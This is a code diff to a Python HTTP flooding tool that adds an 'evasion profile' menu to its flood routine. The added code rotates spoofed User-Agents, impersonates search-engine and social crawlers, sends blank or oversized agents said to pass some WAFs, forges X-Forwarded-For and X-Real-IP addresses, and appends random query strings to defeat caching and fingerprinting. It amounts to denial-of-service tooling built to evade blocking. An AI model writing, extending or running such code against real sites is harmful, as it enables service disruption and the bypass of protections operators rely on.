@@ -28,6 +28,8 @@ import time
 import socket
 import ssl
 import json
+import random
+import string
 import threading
 import urllib.request
 import urllib.error
@@ -365,25 +367,201 @@ def test_latency(target_url, samples=10):
 
 _BODY_METHODS = {"POST", "PUT", "PATCH"}
 
-_USER_AGENTS = [
-    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
-    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
-    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
+# ── Evasion profile: current active profile (set by prompt_evasion_profile) ───
+_EVASION_PROFILE = ["rotate"]   # mutable container so workers see updates
+
+# ─────────────────────────────────────────────────────────────────────────────
+# User-Agent library  (legitimate + spoofed categories)
+# ─────────────────────────────────────────────────────────────────────────────
+_UA_POOLS = {
+    # Real browsers – high-fidelity desktop
+    "legit_desktop": [
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0",
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
+        "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0",
+    ],
+    # Real browsers – mobile
+    "legit_mobile": [
+        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
+        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/124.0.6367.88 Mobile/15E148 Safari/604.1",
+        "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.82 Mobile Safari/537.36",
+        "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.82 Mobile Safari/537.36 SamsungBrowser/24.0",
+        "Mozilla/5.0 (Linux; Android 13; Redmi Note 12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
+        "Mozilla/5.0 (iPad; CPU OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
+    ],
+    # Bots / crawlers (spoofed as legitimate crawlers)
+    "spoofed_bots": [
+        "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
+        "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
+        "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
+        "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)",
+        "Twitterbot/1.0",
+        "LinkedInBot/1.0 (compatible; Mozilla/5.0; Apache-HttpClient +http://www.linkedin.com)",
+        "Slackbot-LinkExpanding 1.0 (+https://api.slack.com/robots)",
+        "WhatsApp/2.24.8.77 A",
+        "Mozilla/5.0 (compatible; DuckDuckBot/1.1; +http://duckduckgo.com/duckduckbot.html)",
+        "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)",
+    ],
+    # Spoofed / malformed / evasion strings
+    "spoofed_evasion": [
+        "curl/8.7.1",
+        "python-requests/2.31.0",
+        "Go-http-client/1.1",
+        "Wget/1.21.4 (linux-gnu)",
+        "axios/1.6.8",
+        "okhttp/4.12.0",
+        "Java/21.0.2",
+        "Apache-HttpClient/4.5.14 (Java/11.0.22)",
+        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)",
+        "Mozilla/5.0 (compatible; MSIE 10.0; Windows Phone 8.0; Trident/6.0)",
+        "",   # blank UA – some WAFs pass this
+        "---",
+        "x" * 512,   # oversized UA
+    ],
+    # Mixed: random pick from all pools
+    "rotate": [],   # populated dynamically below
+}
+
+# Populate the rotate pool with all non-empty UAs from every category
+for _pool_name, _pool_list in _UA_POOLS.items():
+    if _pool_name != "rotate":
+        _UA_POOLS["rotate"].extend([ua for ua in _pool_list if ua])
+
+# ─────────────────────────────────────────────────────────────────────────────
+# Accept-Language variants
+# ─────────────────────────────────────────────────────────────────────────────
+_ACCEPT_LANGS = [
+    "en-US,en;q=0.9",
+    "en-GB,en;q=0.8,en-US;q=0.6",
+    "fr-FR,fr;q=0.9,en;q=0.7",
+    "de-DE,de;q=0.9,en;q=0.8",
+    "es-ES,es;q=0.9,en;q=0.7",
+    "zh-CN,zh;q=0.9,en;q=0.8",
+    "ja-JP,ja;q=0.9,en;q=0.8",
+    "pt-BR,pt;q=0.9,en;q=0.7",
+    "ru-RU,ru;q=0.8,en;q=0.6",
+    "ar-SA,ar;q=0.9,en;q=0.7",
+    "*",
+]
+
+# ─────────────────────────────────────────────────────────────────────────────
+# Accept variants
+# ─────────────────────────────────────────────────────────────────────────────
+_ACCEPTS = [
+    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+    "application/json, text/plain, */*",
+    "*/*",
+    "text/html,*/*;q=0.9",
+    "application/json",
+    "text/html",
+]
+
+# ─────────────────────────────────────────────────────────────────────────────
+# Optional extra headers injected randomly to vary fingerprint
+# ─────────────────────────────────────────────────────────────────────────────
+_EXTRA_HEADERS = [
+    ("X-Forwarded-For",    lambda: "{}.{}.{}.{}".format(
+        random.randint(1,254), random.randint(0,255),
+        random.randint(0,255), random.randint(1,254))),
+    ("X-Real-IP",          lambda: "{}.{}.{}.{}".format(
+        random.randint(1,254), random.randint(0,255),
+        random.randint(0,255), random.randint(1,254))),
+    ("X-Originating-IP",   lambda: "{}.{}.{}.{}".format(
+        random.randint(1,254), random.randint(0,255),
+        random.randint(0,255), random.randint(1,254))),
+    ("Referer",            lambda: random.choice([
+        "https://www.google.com/",
+        "https://www.bing.com/",
+        "https://t.co/",
+        "https://l.facebook.com/",
+        "https://duckduckgo.com/",
+    ])),
+    ("Cache-Control",      lambda: random.choice(["no-cache", "max-age=0", "no-store"])),
+    ("Pragma",             lambda: "no-cache"),
+    ("DNT",                lambda: random.choice(["0", "1"])),
+    ("Upgrade-Insecure-Requests", lambda: "1"),
+    ("Sec-Fetch-Mode",     lambda: random.choice(["navigate", "cors", "no-cors", "same-origin"])),
+    ("Sec-Fetch-Site",     lambda: random.choice(["none", "same-origin", "cross-site", "same-site"])),
+    ("Sec-Fetch-Dest",     lambda: random.choice(["document", "empty", "image", "script"])),
 ]
 
 
-def _single_request(target_url, idx, method):
-    # type: (str, int, str) -> Tuple[bool, float, int]
+def _rand_qs(n=3):
+    # type: (int) -> str
+    """Generate n random query-string key=value pairs."""
+    keys   = ["ref", "src", "utm_source", "utm_medium", "q", "s", "id",
+               "page", "v", "t", "sid", "token", "cb", "ts", "r"]
+    pairs  = []
+    for _ in range(n):
+        k = random.choice(keys)
+        v = "".join(random.choices(string.ascii_lowercase + string.digits, k=random.randint(4, 12)))
+        pairs.append("{}={}".format(k, v))
+    return "&".join(pairs)
+
+
+def _build_headers(profile):
+    # type: (str) -> List[Tuple[str, str]]
+    """
+    Build a shuffled header list for the given evasion profile.
+    Returns a list of (name, value) tuples.
+    """
+    pool = _UA_POOLS.get(profile, _UA_POOLS["rotate"])
+    ua   = random.choice(pool) if pool else "Mozilla/5.0"
+
+    # Core headers – always present
+    core = [
+        ("User-Agent",      ua),
+        ("Accept",          random.choice(_ACCEPTS)),
+        ("Accept-Language", random.choice(_ACCEPT_LANGS)),
+        ("Connection",      random.choice(["keep-alive", "close"])),
+    ]
+
+    # Randomly inject 0-4 extra headers
+    extras = []
+    for hdr_name, hdr_fn in random.sample(_EXTRA_HEADERS, k=random.randint(0, 4)):
+        extras.append((hdr_name, hdr_fn()))
+
+    combined = core + extras
+    # Shuffle everything except User-Agent (keep it first for realism)
+    ua_hdr = combined[:1]
+    rest   = combined[1:]
+    random.shuffle(rest)
+    return ua_hdr + rest
+
+
+def _inject_qs(url, profile):
+    # type: (str, str) -> str
+    """Optionally append random query-string params to the URL."""
+    if profile == "spoofed_evasion":
+        # Always inject for evasion profile
+        inject = True
+    elif profile == "rotate":
+        inject = random.random() < 0.5
+    else:
+        inject = random.random() < 0.25
+
+    if not inject:
+        return url
+
+    sep = "&" if "?" in url else "?"
+    return url + sep + _rand_qs(random.randint(1, 4))
+
+
+def _single_request(target_url, idx, method, profile="rotate"):
+    # type: (str, int, str, str) -> Tuple[bool, float, int]
     """Fire one request through the proxy; return (ok, latency_ms, status)."""
     opener = build_opener()
-    opener.addheaders = [
-        ("User-Agent", _USER_AGENTS[idx % len(_USER_AGENTS)]),
-        ("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"),
-        ("Accept-Language", "en-US,en;q=0.5"),
-        ("Connection", "keep-alive"),
-    ]
+    opener.addheaders = _build_headers(profile)
+
+    # Optionally mutate URL with random query strings
+    req_url = _inject_qs(target_url, profile)
+
     t0 = time.time()
     try:
         body_data = None  # type: Optional[bytes]
@@ -394,7 +572,7 @@ def _single_request(target_url, idx, method):
                 "ts": datetime.utcnow().isoformat(),
             }).encode()
 
-        req = urllib.request.Request(target_url, data=body_data, method=method)
+        req = urllib.request.Request(req_url, data=body_data, method=method)
         if body_data:
             req.add_header("Content-Type", "application/json")
 
@@ -460,7 +638,7 @@ def run_flood(target_url, workers, rps, duration, method, label=None):
         )
 
     def _worker(idx):
-        ok_flag, ms, status = _single_request(target_url, idx, method)
+        ok_flag, ms, status = _single_request(target_url, idx, method, _EVASION_PROFILE[0])
         with lock:
             total_sent[0] += 1
             if ok_flag:
@@ -677,14 +855,56 @@ def show_menu():
             sys.exit(0)
 
 
+# Evasion profile options: (display label, pool key, description)
+_PROFILE_MENU = [
+    ("rotate",         "rotate",         "Random mix of all profiles per request"),
+    ("legit_desktop",  "legit_desktop",  "Legitimate desktop browsers only"),
+    ("legit_mobile",   "legit_mobile",   "Legitimate mobile browsers only"),
+    ("spoofed_bots",   "spoofed_bots",   "Spoofed search/social crawlers"),
+    ("spoofed_evasion","spoofed_evasion","Evasion strings + random query params always"),
+]
+
+
+def show_profile_menu():
+    # type: () -> str
+    """Show the evasion profile menu and return the chosen profile key."""
+    print("\n{}{}  \u2500\u2500 Evasion Profile \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500{}".format(BOLD, CYAN, RESET))
+    for i, (key, _, desc) in enumerate(_PROFILE_MENU, 1):
+        marker = "{}*{}".format(GREEN, RESET) if key == "rotate" else " "
+        print("  {}{}  {}{:>2}.{} {}{:<20}{} {}{}{}".format(
+            BOLD, CYAN, RESET,
+            BOLD, i, RESET,
+            CYAN, key, RESET,
+            DIM, desc, RESET,
+        ))
+    while True:
+        try:
+            raw = input("  {}Choose profile (1\u2013{}) [1]: {}".format(
+                BOLD, len(_PROFILE_MENU), RESET)).strip()
+            if not raw:
+                return "rotate"
+            idx = int(raw) - 1
+            if 0 <= idx < len(_PROFILE_MENU):
+                chosen = _PROFILE_MENU[idx][0]
+                print("  {}\u2714  Profile:{} {}{}{}".format(GREEN, RESET, BOLD, chosen, RESET))
+                return chosen
+            else:
+                warn("Enter 1\u2013{}".format(len(_PROFILE_MENU)))
+        except (ValueError, KeyboardInterrupt, EOFError):
+            return "rotate"
+
+
 def prompt_flood_params():
     # type: () -> Tuple[int, float, float]
-    """Ask only for concurrent connections, target RPS, and duration."""
+    """Ask for concurrent connections, target RPS, duration, and evasion profile."""
     print("\n{}{}  \u2500\u2500 Flood Parameters \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500{}".format(
         BOLD, CYAN, RESET))
     workers  = _prompt_int("Concurrent connections (workers)", 50)
     rps      = _prompt_float("Target RPS (requests/sec)",       100.0)
     duration = _prompt_float("Duration (seconds)",               30.0)
+    profile  = show_profile_menu()
+    _EVASION_PROFILE[0] = profile
+    info("Evasion profile set to: {}{}{}".format(BOLD, profile, RESET))
     return workers, rps, duration
 
 
